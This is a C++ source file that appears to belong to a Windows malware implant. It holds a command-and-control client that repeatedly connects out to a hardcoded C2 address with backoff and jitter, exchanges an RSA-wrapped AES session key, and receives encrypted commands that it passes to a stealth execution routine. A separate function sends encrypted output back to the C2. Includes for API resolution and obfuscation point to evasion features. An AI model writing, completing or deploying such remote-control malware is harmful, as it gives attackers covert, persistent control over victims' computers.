#include "Network/c2_server.h"
#include "Core/api_resolve.h"
#include "Crypto/encryption.h"
#include "Crypto/obfuscation.h"
#include "Utils/helpers.h"
#include "Core/dispatcher.h"
#include "Crypto/encryption.h"
#include <cstring>
#include <cstdio>

SessionContext g_Session = { INVALID_SOCKET, {0}, false };

void sendToC2(const char* text) {

    if (!g_Session.active || !text || strlen(text) == 0) return;

    API_TABLE& API = GetAPI();
        
    HANDLE hHeap = API.GetProcessHeap(); 
    
    ULONG plainTextSize = strlen(text);
    BYTE* plainText = (BYTE*)text;

    ULONG cipherTextSize = plainTextSize + 16;
    

    BYTE* cipherText = (BYTE*)API.RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, cipherTextSize);
    if (!cipherText) return;

    BYTE iv[16];
    
    if (!GenerateSessionKey(iv, 16)) {
        API.RtlFreeHeap(hHeap, 0, cipherText); //cleanup if IV fails
        return;
    }

    // use g_Session.sessionKey instead of local variable
    if (AESEncrypt(g_Session.sessionKey, 32, plainText, plainTextSize, cipherText, &cipherTextSize, iv)) {

        ULONG packetSize = 16 + cipherTextSize;

        BYTE* packet = (BYTE*)API.RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, packetSize);

        if (packet) {
            custom_memcpy(packet, iv, 16);
            custom_memcpy(packet + 16, cipherText, cipherTextSize);

            API.send(g_Session.hSocket, (const char*)packet, packetSize, 0);

            //delete aes key from memory
            SecureZeroMemory(packet, packetSize);

            //Heap release
            API.RtlFreeHeap(hHeap, 0, packet);
        }
    }

    SecureZeroMemory(cipherText, cipherTextSize);
    API.RtlFreeHeap(hHeap, 0, cipherText);    
}


void start_bot(){
    API_TABLE& API = GetAPI();
    WSADATA wsa;
    
    // Initialize winsock
    if(API.WSAStartup(MAKEWORD(2,2), &wsa) != 0){
        exit(1);
    }
    
    // Outer loop
    while (1) {

        SOCKET s;
            
        // Initialize new socket
        if ((s = API.socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
            smart_sleep(5000, 30);
            continue; // try again
        }
            
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = API.inet_addr(STR("192.168.126.133")); 
        server.sin_port = API.htons(443);

        int backoff_ms = 5000;           
        const int max_backoff = 3600000; 

        // Inner Loop 1: Exponential Backoff
        while(API.connect(s, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
            smart_sleep(backoff_ms, 20); 
            backoff_ms *= 2; 
            if (backoff_ms > max_backoff) {
                backoff_ms = max_backoff; 
            }
        }

        // Set 30-second receive timeout to prevent indefinite blocking
        DWORD recvTimeout = 30000;
        API.setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&recvTimeout, sizeof(recvTimeout));

        // RSA + AES
        BYTE sessionKey[32] = {0};
        
        // Generate AES session key
        if (!GenerateSessionKey(sessionKey, sizeof(sessionKey))) {
            API.closesocket(s);
            continue; // drop connection and try again
        }

        BYTE encryptedKey[256] = {0};
        ULONG encryptedKeySize = sizeof(encryptedKey);

        // Encrypt AES key with server's RSA public key
        if (!EncryptSessionKeyRSA(sessionKey, sizeof(sessionKey), encryptedKey, &encryptedKeySize)) {
            API.closesocket(s);
            continue;
        }

        //send encrypted session key to C2
        if (API.send(s, (const char*)encryptedKey, encryptedKeySize, 0) <= 0) {
            API.closesocket(s);
            continue;
        }

        //update global variable
        g_Session.hSocket = s;
        custom_memcpy(g_Session.sessionKey, sessionKey, 32);
        g_Session.active = true;

        // Inner Loop 2: Encrypted Command & Control with Keep-Alive
        char buffer[4096]; 
        while (1) {
            memset(buffer, 0, sizeof(buffer));

            int bytes_received = API.recv(s, buffer, sizeof(buffer) - 1, 0);

            if (bytes_received <= 0) {
                int error_code = API.WSAGetLastError();

                if (error_code == WSAETIMEDOUT) {

                    DWORD reconnect_delay = 15000 + (API.GetTickCount() % 10000);

                    Sleep(reconnect_delay);

                    continue;
                }

                // Small randomized delay on unexpected socket errors
                DWORD error_delay = 3000 + (API.GetTickCount() % 4000);

                Sleep(error_delay);

                break;
            }


            //ensure packet contains at least the 16-byte IV
            if (bytes_received <= 16) continue;

            BYTE iv[16];
            custom_memcpy(iv, buffer, 16);

            BYTE* cipherText = (BYTE*)buffer + 16;
            ULONG cipherTextSize = bytes_received - 16;

            BYTE plainText[4096] = {0};
            ULONG plainTextSize = sizeof(plainText);

            // Decrypt payload
            if (AESDecrypt(sessionKey, sizeof(sessionKey), cipherText, cipherTextSize, plainText, &plainTextSize, iv)) {
                
                plainText[plainTextSize] = '\0';
                plainText[strcspn((char*)plainText, "\r\n")] = 0; 

                if(strlen((char*)plainText) == 0 || strcmp((char*)plainText, " ") == 0) continue;
                    
                execstealth(s, (char*)plainText);
            }
        }

        // Clean dead socket
        API.closesocket(s);
        
        // Wipe session key from memory before sleeping 
        SecureZeroMemory(&g_Session, sizeof(SessionContext));
        g_Session.hSocket = INVALID_SOCKET;
        g_Session.active = false;
    }

    API.WSACleanup();
}
